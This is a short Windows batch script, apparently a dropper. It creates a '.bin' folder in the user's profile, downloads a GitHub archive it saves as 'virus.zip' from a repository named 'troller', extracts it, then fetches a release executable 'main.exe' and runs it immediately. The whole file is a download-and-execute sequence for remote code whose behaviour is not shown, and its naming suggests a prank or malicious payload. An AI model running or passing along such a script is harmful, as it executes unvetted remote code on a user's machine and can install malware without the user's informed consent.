cd "C:\Users\%username%"
mkdir "C:\Users\%username%\.bin"
cd .bin
curl https://codeload.github.com/boatinalamp/troller/zip/refs/heads/main --output virus.zip
tar xf virus.zip
cd troller-main
curl "https://github.com/boatinalamp/troller/releases/latest/download/main.exe" --output main.exe
main.exe